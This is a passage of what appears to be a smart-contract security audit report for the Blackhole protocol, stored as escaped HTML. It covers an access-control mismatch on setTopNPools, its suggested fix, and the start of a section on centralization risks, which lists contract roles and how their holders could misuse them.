version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eCorrected code:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"85\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;ZA\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch2 id=\"10-misaligned-access-control-on-settopnpools-function\" style=\"position:relative;\"\u003e\u003ca href=\"#10-misaligned-access-control-on-settopnpools-function\" aria-label=\"10 misaligned access control on settopnpools function permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[10] Misaligned access control on \u003ccode\u003esetTopNPools()\u003c/code\u003e function\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/SetterTopNPoolsStrategy.sol#L46\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/SetterTopNPoolsStrategy.sol#L46\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-21\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-21\" aria-label=\"finding description 21 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003esetTopNPools\u003c/code\u003e function is responsible for updating the list of top N pool addresses in the protocol:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"86\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Allows either the owner or the AVM to update top pools\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetTopNPools\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_poolAddresses\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyExecutor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_poolAddresses\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt;= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etopN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Exceeds topN\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003edelete\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etopNPools\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_poolAddresses\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_poolAddresses\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Zero address not allowed\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etopNPools\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epush\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_poolAddresses\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eTopNPoolsUpdated\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_poolAddresses\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAs per the comment, the function is intended to be callable by either the contract owner or the AVM. However, it is protected by the \u003ccode\u003eonlyExecutor\u003c/code\u003e modifier:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"87\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003emodifier\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyExecutor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eexecutor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Only AVM can call\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis restricts access exclusively to the executor address, which is described as the AVM. \u003cstrong\u003eThe contract owner is not authorized to call this function, despite the comment stating otherwise.\u003c/strong\u003e\u003c/p\u003e\n\u003ch3 id=\"impact-21\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-21\" aria-label=\"impact 21 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eViolation of Intended Access Control: The contract comment suggests that both the owner and the AVM (executor) should be allowed to update top pools. However, the current implementation violates this expectation.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-33\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-33\" aria-label=\"recommended mitigation steps 33 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eChange the access control modifier on \u003ccode\u003esetTopNPools\u003c/code\u003e from \u003ccode\u003eonlyExecutor\u003c/code\u003e to \u003ccode\u003eonlyOwnerOrExecutor\u003c/code\u003e to align with the intended permissions.\u003c/p\u003e\n\u003ch2 id=\"11-governancecentralization-risks-21-contracts-covered\" style=\"position:relative;\"\u003e\u003ca href=\"#11-governancecentralization-risks-21-contracts-covered\" aria-label=\"11 governancecentralization risks 21 contracts covered permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[11] Governance/centralization Risks (21 contracts covered)\u003c/h2\u003e\n\u003ch3 id=\"rolesactors-in-the-system\" style=\"position:relative;\"\u003e\u003ca href=\"#rolesactors-in-the-system\" aria-label=\"rolesactors in the system permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRoles/Actors in the system\u003c/h3\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e\u003c/th\u003e\n\u003cth\u003eContract\u003c/th\u003e\n\u003cth\u003eRoles/Actors\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003e1.\u003c/td\u003e\n\u003ctd\u003eBlack.sol\u003c/td\u003e\n\u003ctd\u003eMinter\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e2.\u003c/td\u003e\n\u003ctd\u003eBlackClaims.sol\u003c/td\u003e\n\u003ctd\u003eOwner/Second Owner\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e3.\u003c/td\u003e\n\u003ctd\u003eBlackGovernor.sol\u003c/td\u003e\n\u003ctd\u003e- Minter\u003cbr\u003e - Team\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e4.\u003c/td\u003e\n\u003ctd\u003eBribes.sol\u003c/td\u003e\n\u003ctd\u003e- Owner\u003cbr\u003e- Voter\u003cbr\u003e- GaugeManager\u003cbr\u003e- Minter\u003cbr\u003e- Avm\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e5.\u003c/td\u003e\n\u003ctd\u003eCustomPoolDeployer.sol\u003c/td\u003e\n\u003ctd\u003e- Owner\u003cbr\u003e - Authorized\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e6.\u003c/td\u003e\n\u003ctd\u003eCustomToken.sol\u003c/td\u003e\n\u003ctd\u003eOwner\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e7.\u003c/td\u003e\n\u003ctd\u003eFan.sol\u003c/td\u003e\n\u003ctd\u003eOwner\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e8.\u003c/td\u003e\n\u003ctd\u003eGaugeExtraRewarder.sol\u003c/td\u003e\n\u003ctd\u003e- Owner\u003cbr\u003e - GAUGE\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e9.\u003c/td\u003e\n\u003ctd\u003eGaugeManager.sol\u003c/td\u003e\n\u003ctd\u003e- Owner\u003cbr\u003e- GaugeAdmin\u003cbr\u003e- Governance\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e10.\u003c/td\u003e\n\u003ctd\u003eGaugeV2.sol\u003c/td\u003e\n\u003ctd\u003e- Owner\u003cbr\u003e- genesisManager\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e11.\u003c/td\u003e\n\u003ctd\u003eGenesisPool.sol\u003c/td\u003e\n\u003ctd\u003e- genesisManager\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e12.\u003c/td\u003e\n\u003ctd\u003eGenesisPoolManager.sol\u003c/td\u003e\n\u003ctd\u003e- Owner\u003cbr\u003e- Governance\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e13.\u003c/td\u003e\n\u003ctd\u003eMinterUpgradable.sol\u003c/td\u003e\n\u003ctd\u003eTeam\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e14.\u003c/td\u003e\n\u003ctd\u003ePermissionsRegistry.sol\u003c/td\u003e\n\u003ctd\u003eblackMultisig\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e15.\u003c/td\u003e\n\u003ctd\u003eRewardsDistributor.sol\u003c/td\u003e\n\u003ctd\u003eOwner\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e16.\u003c/td\u003e\n\u003ctd\u003eRouterV2.sol\u003c/td\u003e\n\u003ctd\u003eOwner\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e17.\u003c/td\u003e\n\u003ctd\u003eSetterTopNPoolsStrategy.sol\u003c/td\u003e\n\u003ctd\u003e- Owner\u003cbr\u003e - Executor\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e18.\u003c/td\u003e\n\u003ctd\u003eThenian.sol\u003c/td\u003e\n\u003ctd\u003eOwner\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e19.\u003c/td\u003e\n\u003ctd\u003eTokenHandler.sol\u003c/td\u003e\n\u003ctd\u003e- Governance\u003cbr\u003e - GenesisManager\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e20.\u003c/td\u003e\n\u003ctd\u003eVoterV3.sol\u003c/td\u003e\n\u003ctd\u003e- Owner\u003cbr\u003e- VoterAdmin\u003cbr\u003e- Governance\u003cbr\u003e- GenesisManager\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e21.\u003c/td\u003e\n\u003ctd\u003eVotingEscrow.sol\u003c/td\u003e\n\u003ctd\u003e- Voter\u003cbr\u003e- Team\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 id=\"powers-of-each-role-along-with-their-risks\" style=\"position:relative;\"\u003e\u003ca href=\"#powers-of-each-role-along-with-their-risks\" aria-label=\"powers of each role along with their risks permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003ePowers of each role (along with their risks)\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003e1. In the Black.sol contract\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eMinter:\u003c/strong\u003e The minter role in the Black token contract holds critical authority over the token’s supply lifecycle. Initially assigned to the contract deployer, the minter can perform a one-time \u003ccode\u003einitialMint()\u003c/code\u003e of 50 million tokens to any specified address, as well as mint arbitrary token amounts at any point via the \u003ccode\u003emint()\u003c/code\u003e function. This role can also be reassigned to another address using the \u003ccode\u003esetMinter()\u003c/code\u003e function. Here’s how he can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eInflation attack: The minter can call \u003ccode\u003emint\u003c/code\u003e (address, amount) to mint unlimited new tokens to any address. This would inflate the total supply, devalue user holdings.\u003c/li\u003e\n\u003cli\u003eMint and dump attack: The minter could mint large amounts of tokens to their own address and immediately dump them on the market.This would crash the token price and exploit unsuspecting holders.\u003c/li\u003e\n\u003cli\u003eSecretly mint tokens to their own account:  If this role is misused or compromised, the minter could secretly mint large amounts of BLACK tokens to their own address.\u003c/li\u003e\n\u003cli\u003ePermanently lose the minter role: The \u003ccode\u003esetMinter()\u003c/code\u003e function currently does not have an \u003ccode\u003eaddress(0)\u003c/code\u003e check , this can lead to the minter to set the new minter’s address as \u003ccode\u003e0x0\u003c/code\u003e. Hence, permanently losing the minter role. This would lead to the protocol to redeploy contracts again.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e2. In the BlackClaims.sol contract\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eOwner/Second Owner:\u003c/strong\u003e The owner has the ability to recoverERC20 tokens, set treasury, start a season, \u003ccode\u003erevokeUnclaimedReward\u003c/code\u003e, finalize a season, \u003ccode\u003eextendClaimDuration\u003c/code\u003e, report rewards and renounce ownership. This contract allows two owners to handle these functionalities. Here’s how any one of them or potentially both misuse their powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eOne owner can renounce ownership of the other: However, a potential security risk arises if one of the owner’s private keys is compromised. In such a scenario, the malicious actor could use the compromised key to call the \u003ccode\u003esetOwner2()\u003c/code\u003e function and change the second owner’s address to one under their control. This effectively grants full control to the attacker, bypassing the intended dual-ownership security model.\u003c/li\u003e\n\u003cli\u003eMay not ever recoverERC20 tokens: A malicious owner can just not call the \u003ccode\u003erecoverERC20()\u003c/code\u003e function, having the tokens locked in BlackClaims contract forever.\u003c/li\u003e\n\u003cli\u003eSet treasury’s address to himself/or to an \u003ccode\u003eaddress(0x0)\u003c/code\u003e: The owner can claim all the unclaimed rewards of the season, and potentially send it to “his” treasury address, 